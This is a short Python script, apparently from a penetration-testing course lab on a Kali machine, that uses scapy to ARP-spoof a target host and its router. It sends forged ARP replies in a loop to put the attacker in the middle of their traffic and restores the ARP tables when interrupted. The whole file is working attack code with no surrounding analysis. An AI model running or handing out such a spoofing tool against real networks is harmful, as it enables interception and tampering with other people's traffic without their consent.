#!/usr/bin/env python
import scapy.all as scapy
import time
import sys

def restore(ip_des,ip_source):
    mac_des = get_mac(ip_des)
    mac_source = get_mac(ip_source)
    packet = scapy.ARP(op=2, pdst=ip_des, hwdst=mac_des, psrc=ip_source,hwsrc=mac_source)
    # This function just a good man that tell the trust (Has a True MAC Address of it ip_spoof)
    scapy.send(packet,verbose=False,count=4)


def spoof(ip_tar,ip_spoof):
    mac_target = get_mac(ip_tar)
    packet = scapy.ARP(op=2, pdst=ip_tar, hwdst=mac_target, psrc=ip_spoof)
    # the Main point: We tell Target that we are ip_spoof, so we did't taling about hwsrc(source MAC Add.)
    # That's mean we fools that ip that we are ip_spoof but we are dafault(Ours kali)
    scapy.send(packet,verbose=False)

def get_mac(ip):
    #scapy.arping(ip)
    arp_req = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_req_bc = broadcast/arp_req
    ans_lst = scapy.srp(arp_req_bc, timeout=1,verbose=False)[0]
    return ans_lst[0][1].hwsrc

ip_target = "10.0.2.15"
ip_rounter = "10.0.2.1"


try:
    c = 0
    while True:
        spoof(ip_rounter ,ip_target)
        spoof(ip_target,ip_rounter )
        c+=2
        print("\r[+] Sent "+str(c)+" Package"),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    restore(ip_rounter , ip_target)
    restore(ip_target, ip_rounter )
    print("\n[-] Resetting ARP tables....")